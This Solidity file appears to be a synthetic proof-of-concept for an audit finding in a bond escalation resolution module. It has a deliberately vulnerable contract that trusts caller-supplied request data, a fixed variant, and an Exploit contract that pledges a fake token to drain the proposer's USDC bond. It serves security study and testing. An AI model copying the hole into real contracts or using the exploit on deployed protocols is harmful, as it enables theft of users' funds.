// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Wonderland Prophet — BondEscalationResolutionModule accepts a request that
    does not match the dispute (Trail of Bits, finding 41793).
    SYNTHETIC, cheatcode-free. The pledge deadline and bond token are decoded
    from caller-supplied request data. An attacker passes their own token and
    a still-open deadline, out-pledges the dispute, and takes the proposer's
    USDC bond. @> VULN marks the unvalidated decode. */

contract ERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            require(allowed >= amount, "allow");
            allowance[from][msg.sender] = allowed - amount;
        }
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

struct Request {
    bytes32 requestId;
    address bondToken;
    uint256 timeUntilDeadline;
}

struct Dispute {
    bytes32 requestId;
    address proposer;
}

contract BondEscalationResolutionModule {
    uint256 public constant ESCALATION_START = 1;
    ERC20 public usdc;
    mapping(address => uint256) public againstOf;
    mapping(address => uint256) public forOf;
    address public activeToken;
    Dispute public dispute;

    constructor(ERC20 usdc_, Dispute memory dispute_) {
        usdc = usdc_;
        dispute = dispute_;
    }

    function pledgeAgainstDispute(Request calldata request, Dispute calldata supplied, uint256 amount) external {
        require(supplied.requestId == dispute.requestId, "dispute");
        Request memory params = request;
        uint256 deadline = ESCALATION_START + params.timeUntilDeadline; // @> VULN: deadline and bond token come from a request that was never checked against dispute.requestId
        if (block.timestamp >= deadline) revert("BondEscalationResolutionModule_PledgingPhaseOver");
        ERC20(params.bondToken).transferFrom(msg.sender, address(this), amount);
        againstOf[params.bondToken] += amount;
        activeToken = params.bondToken;
    }

    function resolve() external {
        require(activeToken != address(0), "no pledge");
        require(againstOf[activeToken] > forOf[activeToken], "against not ahead");
        uint256 pot = usdc.balanceOf(address(this));
        usdc.transfer(msg.sender, pot);
    }
}

contract BondEscalationResolutionModuleFixed {
    uint256 public constant ESCALATION_START = 1;
    ERC20 public usdc;
    Dispute public dispute;
    address public bondToken;
    uint256 public timeUntilDeadline;

    constructor(ERC20 usdc_, Dispute memory dispute_, address bondToken_, uint256 timeUntilDeadline_) {
        usdc = usdc_;
        dispute = dispute_;
        bondToken = bondToken_;
        timeUntilDeadline = timeUntilDeadline_;
    }

    function pledgeAgainstDispute(Request calldata request, Dispute calldata supplied, uint256 amount) external {
        require(supplied.requestId == dispute.requestId, "dispute");
        bytes32 got = keccak256(abi.encode(request.requestId, request.bondToken, request.timeUntilDeadline));
        require(got == dispute.requestId, "request mismatch");
        uint256 deadline = ESCALATION_START + timeUntilDeadline;
        if (block.timestamp >= deadline) revert("BondEscalationResolutionModule_PledgingPhaseOver");
        ERC20(bondToken).transferFrom(msg.sender, address(this), amount);
    }
}

contract Exploit {
    ERC20 public usdc; // nonce 1
    ERC20 public evil; // nonce 2
    BondEscalationResolutionModule public module; // nonce 3
    bytes32 public realRequestId;

    constructor() {
        usdc = new ERC20("USD Coin", "USDC");
        evil = new ERC20("Attacker Bond", "EVIL");
        realRequestId = keccak256("honest-pricing-request");
        module = new BondEscalationResolutionModule(usdc, Dispute({requestId: realRequestId, proposer: address(0xBEEF)}));
        usdc.mint(address(module), 1000 ether);
        evil.mint(address(this), 1 ether);
    }

    function run() external {
        Dispute memory d = Dispute({requestId: realRequestId, proposer: address(0xBEEF)});
        Request memory fake = Request({
            requestId: keccak256("fake-request"),
            bondToken: address(evil),
            timeUntilDeadline: block.timestamp
        });
        require(keccak256(abi.encode(fake.requestId, fake.bondToken, fake.timeUntilDeadline)) != realRequestId, "ids differ");
        evil.approve(address(module), 1);
        module.pledgeAgainstDispute(fake, d, 1);
        require(module.activeToken() == address(evil), "bond token replaced");
        require(module.againstOf(address(evil)) == 1, "one wei of EVIL leads");
        module.resolve();
        require(usdc.balanceOf(address(this)) == 1000 ether, "proposer bond taken");
        require(usdc.balanceOf(address(module)) == 0, "module paid out");
    }
}
